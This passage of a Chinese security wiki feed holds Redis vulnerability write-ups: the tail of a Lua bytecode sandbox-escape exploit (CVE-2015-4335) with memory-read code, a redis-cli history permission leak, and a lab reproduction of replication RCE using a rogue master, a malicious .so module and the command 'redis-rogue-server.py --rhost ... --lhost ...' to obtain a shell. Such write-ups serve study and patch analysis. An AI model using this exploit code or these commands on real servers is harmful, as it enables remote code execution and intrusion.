return lo, hi</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">ii2f = function(lo, hi) -- Convert uint32_t[2] to double</span><br><span class="line">  local m = hi % 2^20</span><br><span class="line">  local e = (hi - m) / 2^20</span><br><span class="line">  m = m * 2^32 + lo</span><br><span class="line"></span><br><span class="line">  if e ~= 0 then</span><br><span class="line">    m = m + 2^52</span><br><span class="line">  else</span><br><span class="line">    e = 1</span><br><span class="line">  end</span><br><span class="line">  return m * 2^(e-1075)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">read_mem = loadstring(string.dump(function(mem_addr) -- AAAABBBB 1094795585 1111638594</span><br><span class="line">  local magic=nil</span><br><span class="line">  local function middle()</span><br><span class="line">    local f2ii, asnum = f2ii, asnum</span><br><span class="line">    local lud, upval</span><br><span class="line">    local function inner()</span><br><span class="line">      magic = &quot;01234567&quot;</span><br><span class="line">      local lo,hi = f2ii(mem_addr)</span><br><span class="line">      upval = &quot;commonhead16bits&quot;..ub4(lo)..ub4(hi)</span><br><span class="line">      lo,hi = f2ii(asnum(upval));lo = lo+24</span><br><span class="line">      magic = magic..ub4(lo)..ub4(hi)..ub4(lo)..ub4(hi)</span><br><span class="line">    end</span><br><span class="line">    inner()</span><br><span class="line">    return asnum(magic)</span><br><span class="line">  end</span><br><span class="line">  magic = middle()</span><br><span class="line">  return magic</span><br><span class="line">end):gsub(&quot;(\164%z%z%z)....&quot;, &quot;%1\0\0\128\1&quot;, 1))  --&gt; move 0,3</span><br><span class="line"></span><br><span class="line">x=&quot;AAAABBBB&quot;</span><br><span class="line">l,h=f2ii(asnum(x))</span><br><span class="line">x=ii2f(l+24,h)</span><br><span class="line">print(f2ii(read_mem(x)))</span><br></pre></td></tr></table></figure><h4 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h4><p>​        漏洞是因为加载字节码导致的，Redis中的修复，直接禁止字节码加载：</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/11.png"></p><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>​        直接eval命令发lua字节码脚本</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/10.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="http://redis.io/commands/ZADD">http://redis.io/commands/ZADD</a></li><li><a href="http://benmmurphy.github.io/blog/2015/06/04/redis-eval-lua-sandbox-escape/">http://benmmurphy.github.io/blog/2015/06/04/redis-eval-lua-sandbox-escape/</a></li><li><a href="https://github.com/redis/redis/commit/fdf9d455098f54f7666c702ae464e6ea21e25411">https://github.com/redis/redis/commit/fdf9d455098f54f7666c702ae464e6ea21e25411</a></li><li><a href="https://github.com/viruscamp/luadec">https://github.com/viruscamp/luadec</a></li><li><a href="https://juejin.cn/post/6844903572673396750">https://juejin.cn/post/6844903572673396750</a></li><li><a href="https://gist.github.com/corsix/6575486">https://gist.github.com/corsix/6575486</a></li><li><a href="https://www.bbsmax.com/A/mo5kZWW2Jw/">https://www.bbsmax.com/A/mo5kZWW2Jw/</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h2&gt;&lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="漏洞相关" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"/>
    
    <category term="Redis" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"/>
    
    
    <category term="Redis" scheme="http://example.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2013-7458_Redis redis-cli信息泄露漏洞</title>
    <link href="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-07-06T08:13:34.000Z</published>
    <updated>2021-07-06T08:18:58.763Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><ul><li>漏洞名称：Redis redis-cli信息泄露漏洞</li><li>漏洞编号：CVE-2013-7458</li><li>漏洞类型：信息泄露</li><li>CVSS评分：【CVSS v2.0：】【CVSS v3.0：3.3】</li><li>漏洞危害等级：低危</li></ul><h3 id="组件概述"><a href="#组件概述" class="headerlink" title="组件概述"></a>组件概述</h3><p>​        Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p>​        它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>​        Redis redis-cli中存在本地信息泄露漏洞，该漏洞源于程序设置.rediscli_history文件为全局可读。攻击者可利用该漏洞获取敏感信息。</p><h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><p>​        攻击者先需要获取redis-server所在服务器的低权限用户。</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>​        Redis: 3.2.2</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>​        本地使用redis-cli连接redis-server</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli</span><br></pre></td></tr></table></figure><p>​        随便输入一些命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config get client-output-buffer-limit</span><br><span class="line">1) &quot;client-output-buffer-limit&quot;</span><br><span class="line">2) &quot;normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60&quot;</span><br><span class="line">127.0.0.1:6379&gt;info</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/3.png"></p><p>​        退出redis-cli，用本地用户切换到/home路径下，查看.rediscli_history文件，此文件记录了redis-cli的一系列操作。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/1.png"></p><p>​        文件末尾包括刚刚执行的命令。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/2.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="技术背景"><a href="#技术背景" class="headerlink" title="技术背景"></a>技术背景</h3><h4 id="包含头文件"><a href="#包含头文件" class="headerlink" title="包含头文件:"></a>包含头文件:</h4><blockquote><p>/#include &lt;sys/stat.h&gt; 　<br>/#include &lt;sys/types.h&gt;</p></blockquote><h4 id="函数"><a href="#函数" class="headerlink" title="函数:"></a>函数:</h4><blockquote><p>函数原型： 　　int mkdir(const char *pathname, mode_t mode); 　　<br>函数说明： 　　mkdir()函数以mode方式创建一个以参数pathname命名的目录，mode定义新创建目录的权限。 　　<br>返回值： 　　若目录创建成功，则返回0；否则返回-1，并将错误记录到全局变量errno中。</p></blockquote><h4 id="模式类型"><a href="#模式类型" class="headerlink" title="模式类型:"></a>模式类型:</h4><blockquote><p>mode方式： 　　<br>S_IRWXU 00700权限，代表该文件所有者拥有读，写和执行操作的权限<br>S_IRUSR(S_IREAD) 00400权限，代表该文件所有者拥有可读的权限<br>S_IWUSR(S_IWRITE) 00200权限，代表该文件所有者拥有可写的权限<br>S_IXUSR(S_IEXEC) 00100权限，代表该文件所有者拥有执行的权限<br>S_IRWXG 00070权限，代表该文件用户组拥有读，写和执行操作的权限<br>S_IRGRP 00040权限，代表该文件用户组拥有可读的权限<br>S_IWGRP 00020权限，代表该文件用户组拥有可写的权限<br>S_IXGRP 00010权限，代表该文件用户组拥有执行的权限<br>S_IRWXO 00007权限，代表其他用户拥有读，写和执行操作的权限<br>S_IROTH 00004权限，代表其他用户拥有可读的权限<br>S_IWOTH 00002权限，代表其他用户拥有可写的权限<br>S_IXOTH 00001权限，代表其他用户拥有执行的权限</p></blockquote><h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo:"></a>Demo:</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> isCreate = <span class="built_in">mkdir</span>(path,S_IRUSR | S_IWUSR | S_IXUSR | S_IRWXG | S_IRWXO);</span><br><span class="line"><span class="keyword">if</span>( !isCreate )</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;create path:%s\n&quot;</span>,path);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;create path failed! error code : %s \n&quot;</span>,isCreate,path);</span><br></pre></td></tr></table></figure><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>​        如果.rediscli_history文件不存在，则使用默认的umask 0022创建该文件，因此该文件的权限为0644。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/4.png"></p><p>​        redis-cli会将其历史记录默认写入~路径下，通常载/home中的文件夹，默认情况下，该文件夹可以在被其他用户读取，因为权限为0644，如上图所示。</p><p>​        在/deps/linenoise/linenoise.c文件中linenoiseHistorySave的函数，作用为创建一个文件，写入历史记录并保存。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/5.png"></p><p>​        /src/redis-cli.c文件的repl函数，调用了linenoiseHistorySave，来保存历史命令，创建.rediscli_history文件，没有考虑权限分配，默认umask为0022，故创建出一个权限为0644的.rediscli_history文件</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/6.png"></p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/7.png"></p><h4 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h4><p>​    在/deps/linenoise/linenoise.c文件中linenoiseHistorySave函数中增加，umask设置</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/8.png"></p><p>​        打开文件前先进行权限掩码设置：</p><p>​         S_IWUSR 00200权限，代表该文件所有者拥有可写的权限， S_IRWXG 00070权限，代表该文件用户组拥有读，写和执行操作的权限，S_IRWXO 00007权限，代表其他用户拥有读，写和执行操作的权限。</p><p>​        写入数据后，更改文件权限（chmod）为 S_IRUSR 00400权限，代表该文件所有者拥有可读的权限， S_IWUSR(S_IWRITE) 00200权限，代表该文件所有者拥有可写的权限，其他组和其他用户无任何权限。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="http://www.openwall.com/lists/oss-security/2016/07/28/10">http://www.openwall.com/lists/oss-security/2016/07/28/10</a></li><li><a href="https://github.com/antirez/redis/pull/1418">https://github.com/antirez/redis/pull/1418</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h2&gt;&lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="漏洞相关" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"/>
    
    <category term="Redis" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"/>
    
    
    <category term="Redis" scheme="http://example.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>Redis主从复制代码执行漏洞</title>
    <link href="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-07-06T08:02:31.000Z</published>
    <updated>2021-07-06T08:08:53.686Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><ul><li>漏洞名称：Redis Replication代码执行漏洞</li><li>漏洞编号：CNVD-2020-21479</li><li>漏洞类型：代码执行</li><li>CVSS评分：【CVSS v2.0：】【CVSS v3.0：】</li><li>漏洞危害等级：高危</li></ul><h3 id="组件概述"><a href="#组件概述" class="headerlink" title="组件概述"></a>组件概述</h3><p>​        Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p>​        它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>​        Redis Replication存在代码执行漏洞，该漏洞源于网络系统或产品的代码开发过程中存在设计或实现不当的问题。攻击者可利用漏洞执行任意代码。</p><p>由于Redis 4.x以及之后的版本，Redis新增了模块功能，用户可以通过外部拓展实现用户需要的功能，这样就可以在Redis中实现一个新的Redis命令。攻击者可以利用此功能（由Redis的主机实例通过fullresync同步到从机），使被攻击机加载恶意的模块.so文件，从而实现远程命令执行。</p><h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><p>1、Redis配置了空密码或者弱密码</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.png"></p><p>2、Redis配置文件中bind绑定0.0.0.0 127.0.0.1或者被注释</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2.png"></p><p>3、Redis解除保护模式，可以在配置文件将protected-mode，设置为no</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protected-mode no</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/9.png"></p><p>或者，启动redis-server后，在redis-cli中输入命令，临时关闭保护模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET protected-mode no</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3.png"></p><p>3、Redis配置 /var/lib/redis/dump.rdb是slave服务器默认的保存路径，没有保存这个文件的文件夹，创建相应文件夹，给redis用户权限，或者直接运行在root权限下</p><p>攻击者可以远程连接到以上配置的redis，并执行命令。</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>redis 4.x</p><p>redis 5.x</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://download.redis.io/releases/">https://download.redis.io/releases/</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h3><p>10.251.0.33 （kali，master）——————————————————————————-&gt; 10.251.0.36（Redis-server，slave）</p><p>主从关系，攻击机为master，靶机为slave。</p><h3 id="应用协议"><a href="#应用协议" class="headerlink" title="应用协议"></a>应用协议</h3><p>6379/RESP（Redis的序列化协议）</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>启动靶机10.251.0.36的redis-server（slave）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server</span><br></pre></td></tr></table></figure><p>在攻击机Kali 10.251.0.33，本地编译一个恶意的exp.so</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd RedisModulesSDK/exp/</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p><a href="https://github.com/RicterZ/RedisModules-ExecuteCommand">https://github.com/RicterZ/RedisModules-ExecuteCommand</a></p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4.png"></p><p>启动攻击机的redis-server（master），并执行模拟的redis-cli程序，发送恶意命令，既执行redis-rogue-server.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rogue-server.py --rhost 10.251.0.36 --lhost 10.251.0.33</span><br></pre></td></tr></table></figure><p>执行前，先检查攻击机的redis-server（master）和靶机redis-server（slave）的保护模式是否都关闭了，若未关闭，被执行命令的redis服务器会报错</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/6.png"></p><p>在攻击机运行redis-cli，关闭保护模式</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/5.png"></p><p>在靶机上运行redis-cli，关闭保护模式</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3.png"></p><p>启动攻击机的redis-server（master），并执行redis-rogue-server.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rogue-server.py --rhost 10.251.0.36 --lhost 10.251.0.33</span><br></pre></td></tr></table></figure><p>执行后靶机报错，权限不足</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/8.png"></p><p>Redis主从文件权限问题</p><p>问题：Opening the temp file needed for MASTER &lt;-&gt; SLAVE synchronization: Permission denied</p><p>通过日志看出来是同步文件权限的问题</p><p>问题是dump.rdb文件已经成功从master复制的到了slave服务器  /var/lib/redis/dump.rdb是slave服务器默认的保存路径，没有保存这个文件的文件夹，创建相应文件夹，给redis用户权限，靶机redis-server运行在普通用户权限，无法加载.so运行，为了复现顺利，故以root权限运行redis-server</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo redis-server</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/11.png"></p><p>再次执行redis-rogue-server.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rogue-server.py --rhost 10.251.0.36 --lhost 10.251.0.33</span><br></pre></td></tr></table></figure><p>靶机redis-server信息台打印出加载.so成功的信息</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/12.png"></p><p>看一下攻击机kali 的redis-server（master）的控制台信息，发现主从配置成功</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/10.png"></p><p>攻击机kali，redis-rogue-server信息台输出，shell接口，输入id返回ID信息（信息编码问题）</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/13.png"></p><p>从数据包中可以看到id被执行成功后，返回的信息</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/14.png"></p><p>可以看一下执行命令后的主从关系，攻击机为master</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/15.png"></p><p>靶机为slave</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/16.png"></p><p>ps：</p><p>修改了默认的配置文件后，直接启动redis，新的配置文件是不生效的，所以必须指定配置文件路径的方式来启动：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-server /usr/local/redis-4.0.0/redis.conf</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="技术背景"><a href="#技术背景" class="headerlink" title="技术背景"></a>技术背景</h3><h4 id="Redis命令与RESP协议"><a href="#Redis命令与RESP协议" class="headerlink" title="Redis命令与RESP协议"></a>Redis命令与RESP协议</h4><p>​        Redis是轻量级的，非易失性键值数据存储。 它通过Redis序列化协议（RESP）提供对简单易变数据结构的访问，该协议是基于TCP的协议。 与大多数其他数据库一样，Redis遵循客户端—服务器模型。 客户端能够通过Redis命令在Redis服务器上创建，修改和检索记录。 </p><p>​        例如，以下命令创建“ TEST”字符串记录并将其分配给“ 1234”键值，将此记录修改为“ TEST2”并分别检索记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET 1234 TEST</span><br><span class="line">GETSET 1234 TEST2</span><br><span class="line">GET 1234</span><br></pre></td></tr></table></figure><p>​        有关Redis命令的完整列表，请参考 <a href="http://redis.io/commands">http://redis.io/commands</a></p><p>​        Redis客户端通过端口6379通过TCP使用Redis序列化协议（RESP）与服务器进行通信。可通过 <a href="http://redis.io/topics/protocol%E8%8E%B7%E5%BE%97%E8%AF%A5%E5%8D%8F%E8%AE%AE%E8%AF%A6%E7%BB%86%E8%AF%B4%E6%98%8E%E3%80%82">http://redis.io/topics/protocol获得该协议详细说明。</a> RESP使用五种数据类型，这些数据类型由相应数据的第一个字节标识：</p><ul><li><p>简单字符串以“ +”字符开头</p></li><li><p>错误以“-”字符开头</p></li><li><p>整数以“：”字符开头</p></li><li><p>批量字符串以“ $”字符开头</p></li><li><p>数组以“ *”字符开头</p><p>​    批量字符串以“ $”字符开头，后跟相应字符串的长度。 以下重点介绍如何将“ Sangfor”表示为大容量字符串：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$7 CRLF</span><br><span class="line">TELUS</span><br></pre></td></tr></table></figure><p>​        其中CRLF表示新的行序列回车（CR），后跟换行（LF）。 </p><p>​        RESP数组以“ *”字符开头，后跟数组中的元素数。 下面说明了一个由2个元素组成的大容量字符串数组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*2 CRLF</span><br><span class="line">$7 CRLF</span><br><span class="line">Sangfor CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure><p>​        所有Redis命令都通过RESP字符串数组发送到服务器。 例如，上述SET命令将以下形式发送：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*3 CRLF</span><br><span class="line">$3 CRLF</span><br><span class="line">SET CRLF</span><br><span 